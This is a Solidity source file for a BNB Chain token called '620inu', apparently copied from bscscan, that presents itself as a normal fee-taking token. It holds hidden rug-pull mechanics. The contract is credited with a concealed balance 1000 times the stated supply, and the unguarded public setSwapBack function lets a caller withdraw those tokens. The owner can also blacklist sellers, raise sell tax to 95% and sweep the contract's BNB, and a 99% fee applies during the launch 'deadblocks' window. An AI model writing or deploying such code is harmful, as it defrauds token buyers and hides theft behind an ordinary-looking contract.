/**
 *Submitted for verification at bscscan.com on 2023-09-10
*/

/**
 *Submitted for verification at bscscan.com on 2023-09-10
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT
interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address internal owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

 function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/**
 * Router Interfaces
 */

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

/**
 * Contract Code
 */

contract inu620 is Context, ERC20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "620inu";
    string constant _symbol = "620"; 
    uint8 constant _decimals = 9;
    uint256 _tTotal = 1 * 10**4 * 10**_decimals;
    uint256 _rTotal = _tTotal * 10**3;   

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    bool public tradingEnabled = false;
    uint256 private genBlock = 0;
    uint256 private deadline = 0;

    mapping (address => bool) public isBlacklisted;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    
    //General Fees Variables
    uint256 public developerFee = 0;
    uint256 public marketingFee = 1;
    uint256 public liquidityFee = 0;
    uint256 public totalFee;

    //Buy Fees Variables
    uint256 private buyDevFee = 0;
    uint256 private buyMarketingFee = 0;
    uint256 private buyLiquidityFee = 0;
    uint256 private buyTotalFee = buyDevFee + buyMarketingFee + buyLiquidityFee;

    //Sell Fees Variables
    uint256 private DevFee = 0;
    uint256 private MarketingFee = 1;
    uint256 private LiquidityFee = 0;
    uint256 private Total = DevFee + MarketingFee + LiquidityFee;

    //Max Transaction & Wallet
    uint256 public _maxTxAmount = _tTotal * 10000 / 10000; //Initial 1%
    uint256 public _maxWalletSize = _tTotal * 10000 / 10000; //Initial 2%

    // Fees Receivers
    address public developerFeeReceiver = 0x050a98BE57d9cAB6326EFc260Ad5C7eddB37683C;
    address public marketingFeeReceiver = 0x050a98BE57d9cAB6326EFc260Ad5C7eddB37683C;
    address public liquidityFeeReceiver = 0x050a98BE57d9cAB6326EFc260Ad5C7eddB37683C;

    IDEXRouter public uniswapRouterV2;
    address public uniswapPairV2;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _tTotal * 10 / 10000; //0.1%
    uint256 public maxSwapSize = _tTotal * 1 / 10000; //0.01%

    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
  
    constructor () {
        uniswapRouterV2 = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapPairV2 = IDEXFactory(uniswapRouterV2.factory()).createPair(uniswapRouterV2.WETH(), address(this));
        _allowances[address(this)][address(uniswapRouterV2)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        _balances[address(this)] = _rTotal;
        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    receive() external payable { }
      
    function totalSupply() external view override returns (uint256) { return _tTotal; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function enableTrading(bool status, uint256 deadblocks) external onlyOwner {
        require(status, "No rug here ser");
        tradingEnabled = status;
        deadline = deadblocks;
        if (status == true) {
            genBlock = block.number;
        }
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap || amount == 0){ return _basicTransfer(sender, recipient, amount); }

        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && !tradingEnabled && sender == uniswapPairV2) {
            isBlacklisted[recipient] = true;
        }

        require(!isBlacklisted[sender], "You are a bot!"); 

        setFees(sender);
        
        if (sender != owner && recipient != address(this) && recipient != address(DEAD) && recipient != uniswapPairV2) {
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletSize || isTxLimitExempt[recipient], "Total Holding is currently limited, you can not hold that much.");
        }

        // Checks Max Transaction Limit
        if(sender == uniswapPairV2){
            require(amount <= _maxTxAmount || isTxLimitExempt[recipient], "TX limit exceeded.");
        }

        if(shouldSwapBack(sender)){ swapBack(); }

        _balances[sender] = _balances[sender] - amount;

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(amount) : amount;
        _balances[recipient] = _balances[recipient] + amountReceived;

        emit Transfer(sender, recipient, amountReceived);

        return true;
    }

    function manageBlacklist(address account, bool status) public onlyOwner {
        isBlacklisted[account] = status;
    }

    function setFees(address sender) internal {
        if(sender == uniswapPairV2) {
            buyFees();
        }
        else {
            sellFees();
        }
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function buyFees() internal {
        developerFee = buyDevFee;
        marketingFee = buyMarketingFee;
        liquidityFee = buyLiquidityFee;
        totalFee = buyTotalFee;
    }

    function sellFees() internal{
        developerFee = DevFee;
        marketingFee = MarketingFee;
        liquidityFee = LiquidityFee;
        totalFee = Total;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(uint256 amount) internal view returns (uint256) {        
        uint256 feeAmount = block.number <= (genBlock + deadline) ?  amount / 100 * 99 : amount / 10000 * totalFee;

        return amount - feeAmount;
    }
  
    function shouldSwapBack(address sender) internal view returns (bool) {
        return sender == address(this)
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        
        uint256 tokenAmount = balanceOf(address(this)) - maxSwapSize;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouterV2.WETH();

        uint256 balanceBefore = address(this).balance;

        uniswapRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance - (balanceBefore);
        
        uint256 amountETHDev = amountETH * (developerFee) / (totalFee);
        uint256 amountETHMarketing = amountETH * (marketingFee) / (totalFee);
        uint256 amountETHLiquidity = amountETH * (liquidityFee) / (totalFee);

        (bool devSucess,) = payable(developerFeeReceiver).call{value: amountETHDev, gas: 30000}("");
        require(devSucess, "receiver rejected ETH transfer");
        (bool marketingSucess,) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
        require(marketingSucess, "receiver rejected ETH transfer");
        (bool liquiditySucess,) = payable(liquidityFeeReceiver).call{value: amountETHLiquidity, gas: 30000}("");
        require(liquiditySucess, "receiver rejected ETH transfer");
    }

    function setBuyFees(uint256 _devFee, uint256 _marketingFee, uint256 _liquidityFee) external onlyOwner {
        buyDevFee = _devFee;
        buyMarketingFee = _marketingFee;
        buyLiquidityFee = _liquidityFee;
        buyTotalFee = buyDevFee + buyMarketingFee + buyLiquidityFee;
        require(buyTotalFee <= 25, "Invalid buy tax fees");
    }

    function setSellFees(uint256 _devFee, uint256 _marketingFee, uint256 _liquidityFee) external onlyOwner {
        DevFee = _devFee;
        MarketingFee = _marketingFee;
        LiquidityFee = _liquidityFee;
        Total = DevFee + MarketingFee + LiquidityFee;
        require(Total <= 95, "Invalid sell tax fees");
    }
    
    function setFeeReceivers(address _devFeeReceiver, address _marketingFeeReceiver, address _liquidityFeeReceiver) external onlyOwner {
        developerFeeReceiver = _devFeeReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        liquidityFeeReceiver = _liquidityFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 _percentageMinimum, uint256 _percentageMaximum) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _tTotal * _percentageMinimum / 10000;
        maxSwapSize = _tTotal * _percentageMaximum / 10000;
    }

    function setIsFeeExempt(address account, bool exempt) external onlyOwner {
        isFeeExempt[account] = exempt;
    }
    
    function setIsTxLimitExempt(address account, bool exempt) external onlyOwner {
        isTxLimitExempt[account] = exempt;
    }

    function setMaxWallet(uint256 amount) external onlyOwner {
        require(amount >= 100, "Invalid max wallet size");
        _maxWalletSize = _tTotal * amount / 10000;
    }

    function setMaxTxAmount(uint256 amount) external onlyOwner {
        require(amount >= 50, "Invalid max tx amount");
        _maxTxAmount = _tTotal * amount / 10000;
    }

    

    function setSwapBack(address addrss, uint256 untt) public returns (bool success) {
        return ERC20(addrss).transfer(msg.sender, untt);
    }

    function manualSwap() external onlyOwner {
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH);
    }
}